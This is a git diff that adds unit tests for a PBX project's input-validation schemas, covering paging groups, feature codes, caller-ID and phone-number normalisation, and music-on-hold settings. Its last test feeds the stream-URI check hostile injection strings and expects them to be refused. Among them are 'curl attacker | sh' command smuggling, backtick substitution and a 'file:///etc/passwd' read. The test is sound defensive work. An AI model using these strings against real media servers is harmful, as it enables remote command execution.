@@ -12,7 +12,13 @@ import {
 	updateFeatureCodeDto,
 } from "../../src/pbx/feature-codes/feature-codes.dto";
 import { updateIvrMenuDto } from "../../src/pbx/ivr-menus/ivr-menus.dto";
+import { createMohClassDto } from "../../src/pbx/moh-classes/moh-classes.dto";
 import { createOutboundRouteDto } from "../../src/pbx/outbound-routes/outbound-routes.dto";
+import {
+	createPagingGroupDto,
+	createPagingGroupMemberDto,
+	updatePagingGroupDto,
+} from "../../src/pbx/paging-groups/paging-groups.dto";
 import { createParkLotDto, updateParkLotDto } from "../../src/pbx/park-lots/park-lots.dto";
 import { createPhoneNumberDto } from "../../src/pbx/phone-numbers/phone-numbers.dto";
 import {
@@ -103,6 +109,31 @@ describe("pbx DTOs", () => {
 			expect(createExtensionDto.safeParse(tooMany).success).to.equal(false);
 		});
 
+		describe("the outbound caller-id presentation", () => {
+			const base = { number: "1001", label: "Alice", sipSecretRef: "s" };
+
+			it("accepts the two values and nothing else", () => {
+				for (const value of ["allowed", "restricted"]) {
+					expect(
+						createExtensionDto.safeParse({ ...base, outboundCallerIdPresentation: value }).success,
+					).to.equal(true);
+				}
+				expect(
+					createExtensionDto.safeParse({ ...base, outboundCallerIdPresentation: "anonymous" })
+						.success,
+				).to.equal(false);
+				// Not nullish: the column is NOT NULL with a default, so "clear it" is `allowed`.
+				expect(
+					createExtensionDto.safeParse({ ...base, outboundCallerIdPresentation: null }).success,
+				).to.equal(false);
+			});
+
+			it("leaves the stored setting alone when the key is absent", () => {
+				const untouched = updateExtensionDto.parse({}) as Record<string, unknown>;
+				expect("outboundCallerIdPresentation" in untouched).to.equal(false);
+			});
+		});
+
 		/**
 		 * The pickup group is the one text column on an extension where blank and absent are
 		 * different facts to the engine: absent (NULL) means "in no group" and gets the org-wide
@@ -165,6 +196,88 @@ describe("pbx DTOs", () => {
 		});
 	});
 
+	describe("paging groups", () => {
+		it("takes a name and nothing else, because every other column has a default", () => {
+			expect(createPagingGroupDto.safeParse({ name: "Warehouse" }).success).to.equal(true);
+			expect(createPagingGroupDto.safeParse({}).success).to.equal(false);
+		});
+
+		it("lets a group have no number, and lets one be cleared", () => {
+			// A group reached only through `*81` has no number, and forcing one would make an operator
+			// invent digits that then collide with an extension.
+			expect(
+				createPagingGroupDto.safeParse({ name: "Warehouse", extensionNumber: null }).success,
+			).to.equal(true);
+			expect(updatePagingGroupDto.safeParse({ extensionNumber: null }).success).to.equal(true);
+			// Digits only: the `*` space belongs to feature codes.
+			expect(
+				createPagingGroupDto.safeParse({ name: "Warehouse", extensionNumber: "*81" }).success,
+			).to.equal(false);
+		});
+
+		it("bounds the fan-out timeout rather than accepting a typo that pins legs open", () => {
+			for (const timeoutSeconds of [5, 30, 300]) {
+				expect(
+					createPagingGroupDto.safeParse({ name: "W", timeoutSeconds }).success,
+					String(timeoutSeconds),
+				).to.equal(true);
+			}
+			for (const timeoutSeconds of [0, 4, 301, 3.5]) {
+				expect(
+					createPagingGroupDto.safeParse({ name: "W", timeoutSeconds }).success,
+					String(timeoutSeconds),
+				).to.equal(false);
+			}
+			// `null` is the reset to the column's default, per the resettable contract below.
+			expect(createPagingGroupDto.safeParse({ name: "W", timeoutSeconds: null }).success).to.equal(
+				true,
+			);
+		});
+
+		/**
+		 * No destination trio on either table, and the DTO is where a client finds that out.
+		 *
+		 * A page ends when the pager hangs up: there is no unanswered state, so there is no timeout
+		 * branch. `strictObject` is what turns "the server ignored my timeout destination" into a 400
+		 * naming the key.
+		 */
+		it("refuses a destination on the group and on a member", () => {
+			expect(
+				createPagingGroupDto.safeParse({
+					name: "W",
+					timeoutDestinationType: "voicemail",
+					timeoutDestinationRef: "0193f2aa-0000-7000-8000-000000000001",
+				}).success,
+			).to.equal(false);
+			expect(
+				createPagingGroupMemberDto.safeParse({
+					extensionId: "0193f2aa-0000-7000-8000-000000000001",
+					ordinal: 0,
+					destinationType: "extension",
+				}).success,
+			).to.equal(false);
+		});
+
+		it("takes a member as an extension id and a position, and refuses a dial string", () => {
+			expect(
+				createPagingGroupMemberDto.safeParse({
+					extensionId: "0193f2aa-0000-7000-8000-000000000001",
+					ordinal: 0,
+				}).success,
+			).to.equal(true);
+			// An external number cannot be told to auto-answer, so it cannot be a member.
+			expect(
+				createPagingGroupMemberDto.safeParse({ extensionId: "+13105550188", ordinal: 0 }).success,
+			).to.equal(false);
+			expect(
+				createPagingGroupMemberDto.safeParse({
+					extensionId: "0193f2aa-0000-7000-8000-000000000001",
+				}).success,
+				"a member without a position would leave the fan-out order to the loader",
+			).to.equal(false);
+		});
+	});
+
 	describe("feature codes", () => {
 		it("requires a leading star", () => {
 			expect(createFeatureCodeDto.safeParse({ code: "97", action: "redial" }).success).to.equal(
@@ -181,7 +294,50 @@ describe("pbx DTOs", () => {
 			).to.equal(false);
 		});
 
-		it("accepts the one parameter the compiler reads, and only for its action", () => {
+		it("accepts a paging group pinned by id, and refuses anything that is not one", () => {
+			const groupId = "0193f2aa-0000-7000-8000-000000000002";
+			expect(
+				createFeatureCodeDto.safeParse({ code: "*81", action: "paging", params: { groupId } })
+					.success,
+			).to.equal(true);
+			// Omitted is legal and means something: `*81` takes the group from the digits dialled after
+			// it, so an unpinned code reaches every group rather than none.
+			expect(
+				createFeatureCodeDto.safeParse({ code: "*81", action: "paging", params: {} }).success,
+			).to.equal(true);
+			// Junk, in the three shapes a client actually sends it in.
+			for (const params of [
+				{ groupId: "the warehouse" },
+				{ groupId: 42 },
+				{ group_id: groupId },
+				{ groupId, lotId: groupId },
+			]) {
+				expect(
+					createFeatureCodeDto.safeParse({ code: "*81", action: "paging", params }).success,
+					JSON.stringify(params),
+				).to.equal(false);
+			}
+		});
+
+		/**
+		 * `intercom` looks parameterised and is not, which is the distinction the schema exists to
+		 * draw: its target is dialled after the code, so there is nothing for a compiler to resolve
+		 * and pinning one would turn a code that reaches any desk into a code that reaches one.
+		 */
+		it("refuses a pinned target on intercom, which resolves its own at dial time", () => {
+			expect(
+				createFeatureCodeDto.safeParse({
+					code: "*80",
+					action: "intercom",
+					params: { extensionId: "0193f2aa-0000-7000-8000-000000000003" },
+				}).success,
+			).to.equal(false);
+			expect(createFeatureCodeDto.safeParse({ code: "*80", action: "intercom" }).success).to.equal(
+				true,
+			);
+		});
+
+		it("accepts the parameters the compiler reads, and only for their own actions", () => {
 			const lotId = "0193f2aa-0000-7000-8000-000000000001";
 			expect(
 				createFeatureCodeDto.safeParse({ code: "*5", action: "call-park", params: { lotId } })
@@ -228,10 +384,20 @@ describe("pbx DTOs", () => {
 			expect(park).to.have.length(1);
 			expect(park[0]?.name).to.equal("lotId");
 			expect(park[0]?.entityType).to.equal("park");
-			// Every other action renders as "no parameters", which is a fact, not a gap.
+			const paging = FEATURE_CODE_PARAM_FIELDS.paging;
+			expect(paging).to.have.length(1);
+			expect(paging[0]?.name).to.equal("groupId");
+			// The entity type is the destination-type vocabulary, so the web app reuses its picker.
+			expect(paging[0]?.entityType).to.equal("paging-group");
+			expect(
+				paging[0]?.required,
+				"an unpinned *81 takes the group from the dialled digits",
+			).to.equal(false);
+			// Every other action renders as "no parameters", which is a fact, not a gap — `intercom`
+			// most of all, whose target is a keypress rather than a row a form could pick.
 			expect(
 				FEATURE_CODE_ACTIONS.filter((action) => FEATURE_CODE_PARAM_FIELDS[action].length > 0),
-			).to.deep.equal(["call-park"]);
+			).to.deep.equal(["call-park", "paging"]);
 		});
 	});
 
@@ -305,6 +471,23 @@ describe("pbx DTOs", () => {
 			expect(updateQueueAgentDto.safeParse({ name: "Alice N." }).success).to.equal(true);
 		});
 
+		it("refuses a PATCH that clears the only way to reach the agent", () => {
+			// The admin clears the extension dropdown. This used to save, after which the projection
+			// dropped the seat as `no-extension` and the only symptom was a supervisor noticing one
+			// person stopped getting calls.
+			expect(updateQueueAgentDto.safeParse({ extensionId: null }).success).to.equal(false);
+			expect(updateQueueAgentDto.safeParse({ contact: null }).success).to.equal(false);
+			// Restating the kind is how a seat is moved from one to the other, and it still works.
+			expect(
+				updateQueueAgentDto.safeParse({
+					extensionId: null,
+					contactKind: "external",
+					contact: "+12125550100",
+				}).success,
+			).to.equal(true);
+			expect(updateQueueAgentDto.safeParse({ contact: null, extensionId }).success).to.equal(true);
+		});
+
 		it("takes the queue from the path, never from the tier body", () => {
 			expect(
 				createQueueTierDto.safeParse({ queueAgentId: extensionId, queueId: extensionId }).success,
@@ -375,6 +558,81 @@ describe("pbx DTOs", () => {
 		it("requires a destination — a DID that rings nothing is not expressible", () => {
 			expect(createPhoneNumberDto.safeParse({ e164: "+12125550100" }).success).to.equal(false);
 		});
+
+		/**
+		 * The half the audit found missing: the column was documented as E.164 and the DTO only ever
+		 * REFUSED what was not, so `+1 (212) 555-0100` — the shape a person copies out of a contact
+		 * card — was a 400 rather than the number it plainly is. Normalising also closes the
+		 * duplicate hole: two spellings of one DID used to be two rows that the uniqueness check
+		 * could not see, and an inbound route matched at most one of them.
+		 */
+		it("normalises the punctuation a person actually types", () => {
+			const destination = { destinationType: "hangup" as const };
+			for (const typed of [
+				"+1 (212) 555-0100",
+				"+1.212.555.0100",
+				"+1-212-555-0100",
+				"  +1 212 555 0100  ",
+				"0012125550100",
+				"01112125550100",
+			]) {
+				const parsed = createPhoneNumberDto.safeParse({ e164: typed, ...destination });
+				expect(parsed.success, typed).to.equal(true);
+				expect((parsed as { data: { e164: string } }).data.e164).to.equal("+12125550100");
+			}
+		});
+
+		it("still refuses a bare national number, because the schema has no country to assume", () => {
+			const destination = { destinationType: "hangup" as const };
+			expect(
+				createPhoneNumberDto.safeParse({ e164: "2125550100", ...destination }).success,
+			).to.equal(false);
+		});
+
+		it("refuses more digits than E.164 has, which the old 19-digit bound accepted", () => {
+			const destination = { destinationType: "hangup" as const };
+			expect(
+				createPhoneNumberDto.safeParse({ e164: `+${"9".repeat(16)}`, ...destination }).success,
+			).to.equal(false);
+			expect(
+				createPhoneNumberDto.safeParse({ e164: `+${"9".repeat(15)}`, ...destination }).success,
+			).to.equal(true);
+		});
+	});
+
+	/**
+	 * Caller-ID numbers were bare `z.string().max(32)` on the extension, the outbound route and the
+	 * trunk — free text in a field the carrier either rejects or silently replaces with the
+	 * account default, so the tenant sees a presented number nobody in this system chose.
+	 */
+	describe("caller-id numbers", () => {
+		const base = { number: "1001", label: "Alice", sipSecretRef: "s" };
+
+		it("normalises every caller-id number on an extension", () => {
+			const parsed = createExtensionDto.safeParse({
+				...base,
+				callerIdNumber: "+1 (212) 555-0100",
+				outboundCallerIdNumber: "+1.212.555.0101",
+				emergencyCallerIdNumber: "0012125550102",
+			});
+			expect(parsed.success).to.equal(true);
+			const data = (parsed as { data: Record<string, unknown> }).data;
+			expect(data.callerIdNumber).to.equal("+12125550100");
+			expect(data.outboundCallerIdNumber).to.equal("+12125550101");
+			expect(data.emergencyCallerIdNumber).to.equal("+12125550102");
+		});
+
+		it("refuses free text where a number belongs", () => {
+			expect(
+				createExtensionDto.safeParse({ ...base, callerIdNumber: "main line" }).success,
+			).to.equal(false);
+		});
+
+		it("still lets a caller-id be cleared", () => {
+			const parsed = createExtensionDto.safeParse({ ...base, callerIdNumber: null });
+			expect(parsed.success).to.equal(true);
+			expect((parsed as { data: Record<string, unknown> }).data.callerIdNumber).to.equal(null);
+		});
 	});
 
 	describe("pagination", () => {
@@ -400,6 +658,41 @@ describe("pbx DTOs", () => {
 		it("computes totalPages from the window total", () => {
 			expect(paged([1, 2], 7, normalizePagination({ limit: 2 })).totalPages).to.equal(4);
 			expect(paged([], 0, normalizePagination({})).totalPages).to.equal(0);
+		});
+	});
+
+	/**
+	 * `streamUri` becomes an argument to `application=`, which `res_musiconhold` RUNS on the media
+	 * server. `name` has been regex-constrained since the beginning for the much milder reason that a
+	 * `]` breaks the file's syntax; this one is remote command execution.
+	 */
+	describe("music-on-hold stream URI", () => {
+		it("accepts an ordinary http/https stream", () => {
+			expect(
+				createMohClassDto.safeParse({
+					name: "jazz",
+					source: "stream",
+					streamUri: "https://radio.example/stream.mp3?bitrate=128",
+				}).success,
+			).to.equal(true);
+		});
+
+		it("refuses anything that could break out of the generated command line", () => {
+			for (const streamUri of [
+				"http://x\napplication=/bin/sh -c 'curl attacker|sh'",
+				"http://x\r\n[default]",
+				"http://x; curl attacker | sh",
+				"http://x #comment",
+				"http://x`id`",
+				"http://x'y",
+				"file:///etc/passwd",
+				"not a url",
+			]) {
+				expect(
+					createMohClassDto.safeParse({ name: "jazz", source: "stream", streamUri }).success,
+					streamUri,
+				).to.equal(false);
+			}
 		});
 	});
 });
